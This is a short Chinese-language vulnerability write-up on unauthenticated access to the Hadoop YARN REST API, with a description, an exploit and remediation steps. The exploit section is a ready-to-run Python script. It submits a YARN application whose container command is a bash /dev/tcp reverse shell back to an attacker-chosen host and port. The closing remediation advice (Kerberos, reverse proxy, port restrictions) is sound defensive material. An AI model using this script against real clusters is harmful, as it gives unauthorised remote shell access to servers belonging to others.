### 一 漏洞描述
Hadoop是一个由Apache基金会所开发的分布式系统基础架构，YARN是hadoop系统上的资源统一管理平台，其主要作用是实现集群资源的统一管理和调度，可以把MapReduce计算框架作为一个应用程序运行在YARN系统之上。  

YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问的问题。

### 二 漏洞利用
```python
import requests
 
target = 'http://127.0.0.1:8088/'
lhost = '192.168.0.1' # put your local host ip here, and listen at port 9999
 
url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1' % lhost,
        },
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)
```

### 三 漏洞修复
如无必要，关闭Hadoop Web管理页面；  
开启服务级别身份验证，如Kerberos认证；  
部署Knox、Nginx之类的反向代理系统，防止未经授权用户访问；  
设置“安全组”访问控制策略，将Hadoop默认开放的多个端口对公网全部禁止或限制可信任的IP地址才能访问包括50070以及WebUI等相关端口

> 参考链接  
> https://zgao.top/hadoop-yarn-rest-api%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/
